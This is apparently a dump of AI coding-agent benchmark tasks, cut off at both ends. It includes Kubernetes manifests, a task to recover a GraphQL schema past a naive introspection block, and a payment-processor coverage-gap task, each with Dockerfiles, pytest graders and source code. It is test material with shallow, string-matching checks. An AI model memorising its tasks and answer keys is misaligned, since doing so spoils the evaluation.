       ports:\n        - containerPort: 27017\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: mongodb\n  namespace: infrastructure\nspec:\n  selector:\n    app: mongodb\n  ports:\n  - port: 27017\n    targetPort: 27017\n  type: ClusterIP\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: infrastructure\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n        tier: cache\n    spec:\n      containers:\n      - name: redis\n        image: redis:6-alpine\n        ports:\n        - containerPort: 6379\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: redis\n  namespace: infrastructure\nspec:\n  selector:\n    app: redis\n  ports:\n  - port: 6379\n    targetPort: 6379\n  type: ClusterIP\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rabbitmq\n  namespace: infrastructure\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rabbitmq\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n        tier: messaging\n    spec:\n      containers:\n      - name: rabbitmq\n        image: rabbitmq:3.8-alpine\n        ports:\n        - containerPort: 5672\n          name: amqp\n        - containerPort: 15672\n          name: management\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: \""guest\""\n        - name: RABBITMQ_DEFAULT_PASS\n          value: \""guest\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: rabbitmq\n  namespace: infrastructure\nspec:\n  selector:\n    app: rabbitmq\n  ports:\n  - port: 5672\n    targetPort: 5672\n    name: amqp\n  - port: 15672\n    targetPort: 15672\n    name: management\n  type: ClusterIP"", ""user-service.yaml"": ""apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: user-service\n  namespace: production\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: user-service\n  template:\n    metadata:\n      labels:\n        app: user-service\n        tier: backend\n    spec:\n      containers:\n      - name: user-service\n        image: nginx:alpine\n        ports:\n        - containerPort: 8080\n        env:\n        - name: DATABASE_HOST\n          value: \""postgres.infrastructure.svc.cluster.local\""\n        - name: DATABASE_PORT\n          value: \""5432\""\n        - name: CACHE_HOST\n          value: \""redis.infrastructure.svc.cluster.local\""\n        - name: CACHE_PORT\n          value: \""6379\""\n        - name: AUTH_SERVICE_URL\n          value: \""http://auth-service.production.svc.cluster.local:8082\""\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: user-service\n  namespace: production\nspec:\n  selector:\n    app: user-service\n  ports:\n  - port: 8080\n    targetPort: 8080\n  type: ClusterIP"", ""setup-k8s.sh"": ""#!/bin/bash\nset -e\n\necho \""Waiting for k3s to be ready...\""\nuntil kubectl get nodes 2>/dev/null | grep -q Ready; do\n  sleep 2\ndone\n\necho \""Labeling namespaces for network policies...\""\nkubectl label namespace production name=production --overwrite\nkubectl label namespace backend name=backend --overwrite\nkubectl label namespace infrastructure name=infrastructure --overwrite\n\necho \""Applying Kubernetes manifests...\""\nkubectl apply -f /k8s-manifests/namespaces.yaml\nsleep 2\n\nkubectl apply -f /k8s-manifests/infrastructure.yaml\nkubectl apply -f /k8s-manifests/api-gateway.yaml\nkubectl apply -f /k8s-manifests/user-service.yaml\nkubectl apply -f /k8s-manifests/auth-service.yaml\nkubectl apply -f /k8s-manifests/order-service.yaml\nkubectl apply -f /k8s-manifests/inventory-service.yaml\nkubectl apply -f /k8s-manifests/payment-service.yaml\nkubectl apply -f /k8s-manifests/notification-service.yaml\nkubectl apply -f /k8s-manifests/analytics-service.yaml\nkubectl apply -f /k8s-manifests/network-policies.yaml\n\necho \""Waiting for all deployments to be ready...\""\nkubectl wait --for=condition=available --timeout=300s deployment --all -n production\nkubectl wait --for=condition=available --timeout=300s deployment --all -n backend\nkubectl wait --for=condition=available --timeout=300s deployment --all -n infrastructure\n\necho \""Kubernetes cluster setup complete!\""""}",2025-07-21T11:08:41.146286,2025-07-21T11:13:18.306879
draft_dp_0665a172,hard,draft_dp_0665a172,software-engineering,"The GraphQL API at localhost:4000/graphql has introspection disabled. Need to document the complete schema - find all types, queries, and mutations and generate a valid SDL file.",software-engineering,api|python|web-scraping,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

COPY requirements.txt /app/
RUN pip install -r requirements.txt

COPY server.py /app/
COPY start_server.sh /app/
RUN chmod +x /app/start_server.sh

CMD [""/app/start_server.sh""]","import os
import subprocess
import re

def test_schema_file_created():
    """"""Test that a schema SDL file was created.""""""
    # Check for common schema file names
    possible_names = ['schema.sdl', 'schema.graphql', 'api_schema.sdl', 'api_schema.graphql']
    found = False
    for name in possible_names:
        if os.path.exists(f'/app/{name}'):
            found = True
            break
    
    # Also check if any .sdl or .graphql file exists
    if not found:
        result = subprocess.run(['find', '/app', '-name', '*.sdl', '-o', '-name', '*.graphql'], 
                              capture_output=True, text=True)
        if result.stdout.strip():
            found = True
    
    assert found, ""No schema SDL file found""

def test_schema_contains_core_types():
    """"""Test that the schema file contains the main types and operations.""""""
    # Find the schema file
    result = subprocess.run(['find', '/app', '-name', '*.sdl', '-o', '-name', '*.graphql'], 
                          capture_output=True, text=True)
    schema_files = result.stdout.strip().split('\n')
    
    assert schema_files and schema_files[0], ""No schema file found""
    
    # Read the first schema file found
    with open(schema_files[0], 'r') as f:
        schema_content = f.read()
    
    # Check for essential types
    assert 'type Product' in schema_content, ""Product type not found in schema""
    assert 'type User' in schema_content, ""User type not found in schema""
    assert 'type Query' in schema_content, ""Query type not found in schema""
    assert 'type Mutation' in schema_content, ""Mutation type not found in schema""
    
    # Check for key fields
    assert re.search(r'products.*:\s*\[Product', schema_content), ""products query not found""
    assert re.search(r'create_product.*:\s*Product', schema_content), ""create_product mutation not found""","{""test_schema_file_created"": 0.3, ""test_schema_contains_core_types"": 0.7}","{""server.py"": ""import strawberry\nfrom strawberry.asgi import GraphQL\nfrom strawberry.schema.config import StrawberryConfig\nfrom typing import List, Optional\nimport uvicorn\nfrom datetime import datetime\nfrom decimal import Decimal\n\n@strawberry.type\nclass Product:\n    id: strawberry.ID\n    name: str\n    price: Decimal\n    description: str\n    in_stock: bool\n    category: Optional['Category'] = None\n    reviews: List['Review'] = strawberry.field(default_factory=list)\n\n@strawberry.type\nclass Category:\n    id: strawberry.ID\n    name: str\n    description: str\n    products: List[Product] = strawberry.field(default_factory=list)\n\n@strawberry.type\nclass User:\n    id: strawberry.ID\n    email: str\n    name: str\n    created_at: datetime\n    orders: List['Order'] = strawberry.field(default_factory=list)\n\n@strawberry.type\nclass Review:\n    id: strawberry.ID\n    rating: int\n    comment: str\n    product: Product\n    user: User\n    created_at: datetime\n\n@strawberry.type\nclass OrderItem:\n    id: strawberry.ID\n    quantity: int\n    price: Decimal\n    product: Product\n\n@strawberry.type\nclass Order:\n    id: strawberry.ID\n    user: User\n    items: List[OrderItem]\n    total: Decimal\n    status: str\n    created_at: datetime\n\n@strawberry.enum\nclass OrderStatus:\n    PENDING = \""pending\""\n    PROCESSING = \""processing\""\n    SHIPPED = \""shipped\""\n    DELIVERED = \""delivered\""\n\n# Sample data\ncategories = [\n    Category(id=\""1\"", name=\""Electronics\"", description=\""Electronic products\""),\n    Category(id=\""2\"", name=\""Books\"", description=\""Books and publications\"")\n]\n\nproducts = [\n    Product(id=\""1\"", name=\""Laptop\"", price=Decimal(\""999.99\""), description=\""High-performance laptop\"", in_stock=True, category=categories[0]),\n    Product(id=\""2\"", name=\""Python Guide\"", price=Decimal(\""29.99\""), description=\""Complete Python guide\"", in_stock=True, category=categories[1])\n]\n\nusers = [\n    User(id=\""1\"", email=\""john@example.com\"", name=\""John Doe\"", created_at=datetime.now())\n]\n\nreviews = [\n    Review(id=\""1\"", rating=5, comment=\""Excellent!\"", product=products[0], user=users[0], created_at=datetime.now())\n]\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def products(self) -> List[Product]:\n        return products\n    \n    @strawberry.field\n    def product(self, id: strawberry.ID) -> Optional[Product]:\n        return next((p for p in products if p.id == id), None)\n    \n    @strawberry.field\n    def categories(self) -> List[Category]:\n        return categories\n    \n    @strawberry.field\n    def users(self) -> List[User]:\n        return users\n    \n    @strawberry.field\n    def user(self, id: strawberry.ID) -> Optional[User]:\n        return next((u for u in users if u.id == id), None)\n\n@strawberry.input\nclass ProductInput:\n    name: str\n    price: Decimal\n    description: str\n    category_id: Optional[strawberry.ID] = None\n\n@strawberry.input\nclass ReviewInput:\n    rating: int\n    comment: str\n    product_id: strawberry.ID\n    user_id: strawberry.ID\n\n@strawberry.type\nclass Mutation:\n    @strawberry.mutation\n    def create_product(self, input: ProductInput) -> Product:\n        new_product = Product(\n            id=str(len(products) + 1),\n            name=input.name,\n            price=input.price,\n            description=input.description,\n            in_stock=True\n        )\n        if input.category_id:\n            new_product.category = next((c for c in categories if c.id == input.category_id), None)\n        products.append(new_product)\n        return new_product\n    \n    @strawberry.mutation\n    def add_review(self, input: ReviewInput) -> Optional[Review]:\n        product = next((p for p in products if p.id == input.product_id), None)\n        user = next((u for u in users if u.id == input.user_id), None)\n        if product and user:\n            new_review = Review(\n                id=str(len(reviews) + 1),\n                rating=input.rating,\n                comment=input.comment,\n                product=product,\n                user=user,\n                created_at=datetime.now()\n            )\n            reviews.append(new_review)\n            return new_review\n        return None\n\n# Custom schema with limited introspection\nclass LimitedIntrospectionSchema(strawberry.Schema):\n    def execute_sync(self, query, *args, **kwargs):\n        # Block full schema introspection but allow type queries\n        if \""__schema\"" in query and \""types\"" in query:\n            return strawberry.ExecutionResult(\n                data=None,\n                errors=[{\""message\"": \""Full schema introspection is disabled\""}]\n            )\n        return super().execute_sync(query, *args, **kwargs)\n\nschema = LimitedIntrospectionSchema(\n    query=Query,\n    mutation=Mutation,\n    config=StrawberryConfig(auto_camel_case=False)\n)\n\napp = GraphQL(schema)\n\nif __name__ == \""__main__\"":\n    uvicorn.run(app, host=\""0.0.0.0\"", port=4000)"", ""requirements.txt"": ""strawberry-graphql[asgi]==0.235.2\nuvicorn==0.30.1\nrequests==2.32.3\ngraphql-core==3.2.3"", ""start_server.sh"": ""#!/bin/bash\npython /app/server.py &\nsleep 5\necho \""GraphQL server started on port 4000\""\ntail -f /dev/null""}",2025-07-21T11:34:30.743321,2025-07-21T11:34:30.743321
draft_dp_891ea002,medium,draft_dp_891ea002,software-engineering,"The payment processor tests are only hitting 60% coverage. Need a complete map of what's not tested - functions, branches, error handling. Output as JSON to coverage_gaps.json.",software-engineering,python|unit-testing|analysis,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install pytest coverage pytest-cov

# Copy the payment processing system
COPY payment_processor.py /app/
COPY currency_converter.py /app/
COPY fee_calculator.py /app/
COPY fraud_detector.py /app/
COPY refund_handler.py /app/
COPY transaction_logger.py /app/
COPY customer_manager.py /app/
COPY webhook_handler.py /app/
COPY batch_processor.py /app/
COPY notification_service.py /app/
COPY api_gateway.py /app/
COPY report_generator.py /app/
COPY settlement_processor.py /app/
COPY utils.py /app/
COPY __init__.py /app/

# Copy test files
COPY tests/ /app/tests/
COPY pytest.ini /app/

# Create empty log files that some modules expect
RUN touch /app/transactions.log && \
    touch /app/suspicious_transactions.log && \
    touch /app/blocked_ips.log

# Set Python path
ENV PYTHONPATH=/app

CMD [""/bin/bash""]","import json
import os
import subprocess


def test_coverage_map_completeness():
    """"""Test that the coverage map includes all untested code regions.""""""
    # Check that coverage_gaps.json exists
    assert os.path.exists(""/app/coverage_gaps.json""), ""coverage_gaps.json file not found""
    
    # Load the coverage map
    with open(""/app/coverage_gaps.json"", ""r"") as f:
        coverage_gaps = json.load(f)
    
    # Verify structure
    assert isinstance(coverage_gaps, dict), ""Coverage map should be a dictionary""
    assert ""uncovered_functions"" in coverage_gaps, ""Missing uncovered_functions key""
    assert ""uncovered_branches"" in coverage_gaps, ""Missing uncovered_branches key""
    assert ""uncovered_files"" in coverage_gaps, ""Missing uncovered_files key""
    
    # Run coverage to get actual gaps
    result = subprocess.run(
        [""coverage"", ""run"", ""-m"", ""pytest"", ""tests/"", ""-q""],
        capture_output=True,
        text=True
    )
    
    # Get coverage report
    report_result = subprocess.run(
        [""coverage"", ""report"", ""--include=*.py"", ""--omit=tests/*,test_*.py""],
        capture_output=True,
        text=True
    )
    
    # Verify all untested modules are identified
    expected_untested = [""refund_handler.py"", ""transaction_logger.py"", ""customer_manager.py"", 
                        ""webhook_handler.py"", ""batch_processor.py"", ""notification_service.py"",
                        ""api_gateway.py"", ""report_generator.py"", ""settlement_processor.py""]
    
    for module in expected_untested:
        found = False
        for file_info in coverage_gaps.get(""uncovered_files"", []):
            if module in file_info.get(""file"", """"):
                found = True
                break
        assert found, f""Untested module {module} not found in coverage map""
    
    # Verify some partially tested modules have branch info
    partial_modules = [""payment_processor.py"", ""fraud_detector.py"", ""fee_calculator.py""]
    for module in partial_modules:
        found = False
        for branch_info in coverage_gaps.get(""uncovered_branches"", []):
            if module in branch_info.get(""file"", """"):
                found = True
                assert ""line_numbers"" in branch_info, f""Missing line numbers for {module}""
                break
        assert found, f""Partially tested module {module} should have uncovered branches""


def test_coverage_accuracy():
    """"""Test that identified gaps are actually uncovered by tests.""""""
    # Load the coverage map
    with open(""/app/coverage_gaps.json"", ""r"") as f:
        coverage_gaps = json.load(f)
    
    # Generate detailed coverage data
    subprocess.run(
        [""coverage"", ""run"", ""-m"", ""pytest"", ""tests/"", ""-q""],
        capture_output=True
    )
    
    # Export coverage data to JSON
    subprocess.run(
        [""coverage"", ""json"", ""-o"", ""/tmp/coverage.json""],
        capture_output=True
    )
    
    # Load actual coverage data
    with open(""/tmp/coverage.json"", ""r"") as f:
        actual_coverage = json.load(f)
    
    # Verify uncovered functions are actually not covered
    for func_info in coverage_gaps.get(""uncovered_functions"", []):
        file_path = func_info.get(""file"", """")
        function_name = func_info.get(""function"", """")
        
        if file_path and file_path in actual_coverage.get(""files"", {}):
            file_coverage = actual_coverage[""files""][file_path]
            
            # Check if function lines are executed
            if ""executed_lines"" in file_coverage and func_info.get(""start_line""):
                start_line = func_info[""start_line""]
                end_line = func_info.get(""end_line"", start_line + 10)
                
                # Verify no lines in function range are executed
                executed_lines = set(file_coverage[""executed_lines""])
                function_lines = set(range(start_line, end_line + 1))
                
                intersection = executed_lines & function_lines
                assert len(intersection) == 0, f""Function {function_name} in {file_path} is marked as uncovered but has executed lines""
    
    # Verify the coverage percentage matches expectations
    total_lines = sum(f[""summary""][""num_statements""] for f in actual_coverage[""files""].values())
    covered_lines = sum(f[""summary""][""covered_lines""] for f in actual_coverage[""files""].values())
    
    if total_lines > 0:
        coverage_percentage = (covered_lines / total_lines) * 100
        # We expect around 60% coverage
        assert 55 <= coverage_percentage <= 65, f""Coverage percentage {coverage_percentage:.1f}% is outside expected range (55-65%)""","{""test_coverage_map_completeness"": 0.4, ""test_coverage_accuracy"": 0.6}","{""api_gateway.py"": ""from typing import Dict, List, Optional\nimport datetime\nimport json\nimport uuid\n\n\nclass APIGateway:\n    def __init__(self):\n        self.api_keys = {}\n        self.rate_limits = {\n            'default': {'requests_per_minute': 60, 'requests_per_hour': 1000},\n            'premium': {'requests_per_minute': 300, 'requests_per_hour': 10000}\n        }\n        self.request_log = []\n        self.blocked_ips = set()\n        \n    def create_api_key(self, merchant_id: str, tier: str = 'default') -> Dict:\n        if tier not in self.rate_limits:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid tier\""}\n            \n        api_key = self._generate_api_key()\n        \n        self.api_keys[api_key] = {\n            'merchant_id': merchant_id,\n            'tier': tier,\n            'created_at': datetime.datetime.now(),\n            'active': True,\n            'request_count': 0,\n            'last_request': None\n        }\n        \n        return {\n            \""status\"": \""success\"",\n            \""api_key\"": api_key,\n            \""tier\"": tier,\n            \""rate_limits\"": self.rate_limits[tier]\n        }\n    \n    def validate_request(self, api_key: str, ip_address: str, \n                        endpoint: str, method: str = 'GET') -> Dict:\n        # Check if IP is blocked\n        if ip_address in self.blocked_ips:\n            return {\""status\"": \""blocked\"", \""error\"": \""IP address blocked\""}\n            \n        # Check if API key exists\n        if api_key not in self.api_keys:\n            return {\""status\"": \""unauthorized\"", \""error\"": \""Invalid API key\""}\n            \n        key_info = self.api_keys[api_key]\n        \n        # Check if key is active\n        if not key_info['active']:\n            return {\""status\"": \""unauthorized\"", \""error\"": \""API key deactivated\""}\n            \n        # Check rate limits\n        rate_check = self._check_rate_limit(api_key)\n        if not rate_check['allowed']:\n            return {\n                \""status\"": \""rate_limited\"",\n                \""error\"": rate_check['message'],\n                \""retry_after\"": rate_check.get('retry_after', 60)\n            }\n            \n        # Log request\n        self._log_request(api_key, ip_address, endpoint, method)\n        \n        return {\n            \""status\"": \""authorized\"",\n            \""merchant_id\"": key_info['merchant_id'],\n            \""tier\"": key_info['tier']\n        }\n    \n    def _generate_api_key(self) -> str:\n        return f\""pk_{'live' if datetime.datetime.now().second % 2 else 'test'}_{uuid.uuid4().hex}\""\n    \n    def _check_rate_limit(self, api_key: str) -> Dict:\n        key_info = self.api_keys[api_key]\n        tier_limits = self.rate_limits[key_info['tier']]\n        \n        now = datetime.datetime.now()\n        \n        # Get requests in last minute\n        minute_ago = now - datetime.timedelta(minutes=1)\n        minute_requests = sum(\n            1 for req in self.request_log \n            if req['api_key'] == api_key and req['timestamp'] > minute_ago\n        )\n        \n        if minute_requests >= tier_limits['requests_per_minute']:\n            return {\n                'allowed': False,\n                'message': 'Minute rate limit exceeded',\n                'retry_after': 60\n            }\n            \n        # Get requests in last hour\n        hour_ago = now - datetime.timedelta(hours=1)\n        hour_requests = sum(\n            1 for req in self.request_log \n            if req['api_key'] == api_key and req['timestamp'] > hour_ago\n        )\n        \n        if hour_requests >= tier_limits['requests_per_hour']:\n            return {\n                'allowed': False,\n                'message': 'Hourly rate limit exceeded',\n                'retry_after': 3600\n            }\n            \n        return {'allowed': True}\n    \n    def _log_request(self, api_key: str, ip_address: str, endpoint: str, method: str):\n        request = {\n            'api_key': api_key,\n            'ip_address': ip_address,\n            'endpoint': endpoint,\n            'method': method,\n            'timestamp': datetime.datetime.now()\n        }\n        \n        self.request_log.append(request)\n        \n        # Update key stats\n        self.api_keys[api_key]['request_count'] += 1\n        self.api_keys[api_key]['last_request'] = request['timestamp']\n        \n        # Keep only last 24 hours of logs\n        cutoff = datetime.datetime.now() - datetime.timedelta(hours=24)\n        self.request_log = [req for req in self.request_log if req['timestamp'] > cutoff]\n    \n    def revoke_api_key(self, api_key: str) -> Dict:\n        if api_key not in self.api_keys:\n            return {\""status\"": \""error\"", \""message\"": \""API key not found\""}\n            \n        self.api_keys[api_key]['active'] = False\n        self.api_keys[api_key]['revoked_at'] = datetime.datetime.now()\n        \n        return {\""status\"": \""success\"", \""message\"": \""API key revoked\""}\n    \n    def block_ip(self, ip_address: str, reason: str) -> Dict:\n        self.blocked_ips.add(ip_address)\n        \n        # Log the block\n        with open('blocked_ips.log', 'a') as f:\n            f.write(f\""{datetime.datetime.now()}: Blocked {ip_address} - {reason}\\n\"")\n            \n        return {\""status\"": \""success\"", \""message\"": f\""IP {ip_address} blocked\""}\n    \n    def get_api_key_stats(self, api_key: str) -> Optional[Dict]:\n        if api_key not in self.api_keys:\n            return None\n            \n        key_info = self.api_keys[api_key]\n        \n        # Calculate current usage\n        now = datetime.datetime.now()\n        hour_ago = now - datetime.timedelta(hours=1)\n        \n        hour_requests = sum(\n            1 for req in self.request_log \n            if req['api_key'] == api_key and req['timestamp'] > hour_ago\n        )\n        \n        tier_limits = self.rate_limits[key_info['tier']]\n        \n        return {\n            'api_key': api_key[:12] + '...',  # Partial key for security\n            'merchant_id': key_info['merchant_id'],\n            'tier': key_info['tier'],\n            'active': key_info['active'],\n            'total_requests': key_info['request_count'],\n            'current_hour_requests': hour_requests,\n            'hour_limit': tier_limits['requests_per_hour'],\n            'usage_percentage': (hour_requests / tier_limits['requests_per_hour']) * 100\n        }\n    \n    def get_endpoint_analytics(self, hours: int = 24) -> Dict:\n        cutoff = datetime.datetime.now() - datetime.timedelta(hours=hours)\n        \n        endpoint_stats = {}\n        \n        for request in self.request_log:\n            if request['timestamp'] > cutoff:\n                endpoint = request['endpoint']\n                if endpoint not in endpoint_stats:\n                    endpoint_stats[endpoint] = {\n                        'count': 0,\n                        'methods': {},\n                        'unique_keys': set()\n                    }\n                    \n                endpoint_stats[endpoint]['count'] += 1\n                endpoint_stats[endpoint]['unique_keys'].add(request['api_key'])\n                \n                method = request['method']\n                endpoint_stats[endpoint]['methods'][method] = \\\n                    endpoint_stats[endpoint]['methods'].get(method, 0) + 1\n                    \n        # Convert sets to counts\n        for endpoint in endpoint_stats:\n            endpoint_stats[endpoint]['unique_keys'] = \\\n                len(endpoint_stats[endpoint]['unique_keys'])\n                \n        return {\n            'period_hours': hours,\n            'endpoints': endpoint_stats,\n            'total_requests': sum(e['count'] for e in endpoint_stats.values())\n        }\n    \n    def upgrade_tier(self, api_key: str, new_tier: str) -> Dict:\n        if api_key not in self.api_keys:\n            return {\""status\"": \""error\"", \""message\"": \""API key not found\""}\n            \n        if new_tier not in self.rate_limits:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid tier\""}\n            \n        self.api_keys[api_key]['tier'] = new_tier\n        self.api_keys[api_key]['tier_updated_at'] = datetime.datetime.now()\n        \n        return {\n            \""status\"": \""success\"",\n            \""new_tier\"": new_tier,\n            \""new_limits\"": self.rate_limits[new_tier]\n        }"", ""batch_processor.py"": ""from decimal import Decimal\nfrom typing import Dict, List, Optional\nimport datetime\nimport csv\nimport json\n\n\nclass BatchProcessor:\n    def __init__(self):\n        self.batches = {}\n        self.batch_limits = {\n            'max_size': 1000,\n            'max_amount': Decimal('100000'),\n            'timeout_hours': 24\n        }\n        \n    def create_batch(self, batch_type: str = 'payment') -> Dict:\n        batch_id = f\""BATCH{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}\""\n        \n        self.batches[batch_id] = {\n            'id': batch_id,\n            'type': batch_type,\n            'status': 'open',\n            'created_at': datetime.datetime.now(),\n            'transactions': [],\n            'total_amount': Decimal('0'),\n            'processed_count': 0,\n            'failed_count': 0\n        }\n        \n        return {\""status\"": \""success\"", \""batch_id\"": batch_id}\n    \n    def add_to_batch(self, batch_id: str, transaction: Dict) -> Dict:\n        if batch_id not in self.batches:\n            return {\""status\"": \""error\"", \""message\"": \""Batch not found\""}\n            \n        batch = self.batches[batch_id]\n        \n        if batch['status'] != 'open':\n            return {\""status\"": \""error\"", \""message\"": \""Batch is not open\""}\n            \n        if len(batch['transactions']) >= self.batch_limits['max_size']:\n            return {\""status\"": \""error\"", \""message\"": \""Batch size limit reached\""}\n            \n        amount = Decimal(str(transaction.get('amount', 0)))\n        if batch['total_amount'] + amount > self.batch_limits['max_amount']:\n            return {\""status\"": \""error\"", \""message\"": \""Batch amount limit would be exceeded\""}\n            \n        batch['transactions'].append({\n            'transaction_id': transaction.get('id'),\n            'amount': amount,\n            'card_number': transaction.get('card_number'),\n            'added_at': datetime.datetime.now()\n        })\n        \n        batch['total_amount'] += amount\n        \n        return {\n            \""status\"": \""success\"",\n            \""transaction_count\"": len(batch['transactions']),\n            \""total_amount\"": str(batch['total_amount'])\n        }\n    \n    def close_batch(self, batch_id: str) -> Dict:\n        if batch_id not in self.batches:\n            return {\""status\"": \""error\"", \""message\"": \""Batch not found\""}\n            \n        batch = self.batches[batch_id]\n        \n        if batch['status'] != 'open':\n            return {\""status\"": \""error\"", \""message\"": \""Batch is not open\""}\n            \n        batch['status'] = 'closed'\n        batch['closed_at'] = datetime.datetime.now()\n        \n        return {\n            \""status\"": \""success\"",\n            \""batch_id\"": batch_id,\n            \""transaction_count\"": len(batch['transactions']),\n            \""total_amount\"": str(batch['total_amount'])\n        }\n    \n    def process_batch(self, batch_id: str) -> Dict:\n        if batch_id not in self.batches:\n            return {\""status\"": \""error\"", \""message\"": \""Batch not found\""}\n            \n        batch = self.batches[batch_id]\n        \n        if batch['status'] == 'open':\n            self.close_batch(batch_id)\n            \n        if batch['status'] == 'processed':\n            return {\""status\"": \""error\"", \""message\"": \""Batch already processed\""}\n            \n        batch['status'] = 'processing'\n        batch['processing_started_at'] = datetime.datetime.now()\n        \n        # Simulate processing\n        processed = 0\n        failed = 0\n        \n        for transaction in batch['transactions']:\n            # Simulate success/failure\n            if transaction['card_number'] and not transaction['card_number'].startswith('0000'):\n                processed += 1\n                transaction['status'] = 'success'\n            else:\n                failed += 1\n                transaction['status'] = 'failed'\n                transaction['error'] = 'Invalid card number'\n                \n        batch['processed_count'] = processed\n        batch['failed_count'] = failed\n        batch['status'] = 'processed'\n        batch['processing_completed_at'] = datetime.datetime.now()\n        \n        processing_time = (batch['processing_completed_at'] - batch['processing_started_at']).total_seconds()\n        \n        return {\n            \""status\"": \""success\"",\n            \""batch_id\"": batch_id,\n            \""processed\"": processed,\n            \""failed\"": failed,\n            \""processing_time_seconds\"": processing_time\n        }\n    \n    def get_batch_status(self, batch_id: str) -> Optional[Dict]:\n        if batch_id not in self.batches:\n            return None\n            \n        batch = self.batches[batch_id]\n        \n        return {\n            'batch_id': batch_id,\n            'status': batch['status'],\n            'transaction_count': len(batch['transactions']),\n            'total_amount': str(batch['total_amount']),\n            'processed': batch['processed_count'],\n            'failed': batch['failed_count'],\n            'created_at': batch['created_at'].isoformat()\n        }\n    \n    def export_batch_results(self, batch_id: str, output_file: str) -> bool:\n        if batch_id not in self.batches:\n            return False\n            \n        batch = self.batches[batch_id]\n        \n        if batch['status'] != 'processed':\n            return False\n            \n        try:\n            with open(output_file, 'w', newline='') as csvfile:\n                fieldnames = ['transaction_id', 'amount', 'status', 'error']\n                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n                \n                writer.writeheader()\n                for trans in batch['transactions']:\n                    writer.writerow({\n                        'transaction_id': trans.get('transaction_id'),\n                        'amount': str(trans.get('amount')),\n                        'status': trans.get('status', 'pending'),\n                        'error': trans.get('error', '')\n                    })\n                    \n            return True\n        except Exception:\n            return False\n    \n    def get_pending_batches(self) -> List[Dict]:\n        pending = []\n        \n        for batch_id, batch in self.batches.items():\n            if batch['status'] in ['open', 'closed']:\n                age_hours = (datetime.datetime.now() - batch['created_at']).total_seconds() / 3600\n                \n                pending.append({\n                    'batch_id': batch_id,\n                    'status': batch['status'],\n                    'transaction_count': len(batch['transactions']),\n                    'total_amount': str(batch['total_amount']),\n                    'age_hours': age_hours,\n                    'is_expired': age_hours > self.batch_limits['timeout_hours']\n                })\n                \n        return sorted(pending, key=lambda x: x['age_hours'], reverse=True)\n    \n    def auto_close_expired_batches(self) -> Dict:\n        closed_count = 0\n        \n        for batch_id, batch in self.batches.items():\n            if batch['status'] == 'open':\n                age_hours = (datetime.datetime.now() - batch['created_at']).total_seconds() / 3600\n                \n                if age_hours > self.batch_limits['timeout_hours']:\n                    self.close_batch(batch_id)\n                    closed_count += 1\n                    \n        return {\n            'closed_count': closed_count,\n            'checked_batches': len(self.batches)\n        }\n    \n    def get_batch_metrics(self, hours: int = 24) -> Dict:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(hours=hours)\n        \n        total_batches = 0\n        total_transactions = 0\n        total_amount = Decimal('0')\n        success_rate_sum = 0\n        \n        for batch in self.batches.values():\n            if batch['created_at'] > cutoff_time:\n                total_batches += 1\n                total_transactions += len(batch['transactions'])\n                total_amount += batch['total_amount']\n                \n                if batch['status'] == 'processed' and batch['processed_count'] > 0:\n                    success_rate = batch['processed_count'] / len(batch['transactions'])\n                    success_rate_sum += success_rate\n                    \n        avg_success_rate = success_rate_sum / total_batches if total_batches > 0 else 0\n        \n        return {\n            'period_hours': hours,\n            'total_batches': total_batches,\n            'total_transactions': total_transactions,\n            'total_amount': str(total_amount),\n            'average_batch_size': total_transactions / total_batches if total_batches > 0 else 0,\n            'average_success_rate': avg_success_rate\n        }"", ""settlement_processor.py"": ""from decimal import Decimal\nfrom typing import Dict, List, Optional\nimport datetime\nimport uuid\n\n\nclass SettlementProcessor:\n    def __init__(self):\n        self.settlements = {}\n        self.pending_transactions = []\n        self.settlement_schedule = {\n            'standard': 2,  # T+2 days\n            'express': 1,   # T+1 days\n            'same_day': 0   # T+0 days\n        }\n        \n    def add_transaction(self, transaction: Dict) -> Dict:\n        if transaction.get('status') != 'success':\n            return {\""status\"": \""error\"", \""message\"": \""Only successful transactions can be settled\""}\n            \n        pending = {\n            'transaction_id': transaction.get('transaction_id'),\n            'merchant_id': transaction.get('merchant_id'),\n            'amount': Decimal(str(transaction.get('amount', 0))),\n            'fee': Decimal(str(transaction.get('fee', 0))),\n            'created_at': datetime.datetime.now(),\n            'settlement_type': transaction.get('settlement_type', 'standard')\n        }\n        \n        self.pending_transactions.append(pending)\n        \n        return {\n            \""status\"": \""success\"",\n            \""message\"": \""Transaction added to settlement queue\"",\n            \""expected_settlement\"": self._calculate_settlement_date(pending['settlement_type'])\n        }\n    \n    def create_settlement_batch(self, merchant_id: str) -> Dict:\n        eligible_transactions = self._get_eligible_transactions(merchant_id)\n        \n        if not eligible_transactions:\n            return {\""status\"": \""error\"", \""message\"": \""No eligible transactions for settlement\""}\n            \n        settlement_id = self._generate_settlement_id()\n        \n        total_amount = sum(t['amount'] for t in eligible_transactions)\n        total_fees = sum(t['fee'] for t in eligible_transactions)\n        net_amount = total_amount - total_fees\n        \n        settlement = {\n            'id': settlement_id,\n            'merchant_id': merchant_id,\n            'status': 'pending',\n            'created_at': datetime.datetime.now(),\n            'transaction_count': len(eligible_transactions),\n            'gross_amount': total_amount,\n            'total_fees': total_fees,\n            'net_amount': net_amount,\n            'transactions': eligible_transactions\n        }\n        \n        self.settlements[settlement_id] = settlement\n        \n        # Remove from pending\n        for trans in eligible_transactions:\n            self.pending_transactions.remove(trans)\n            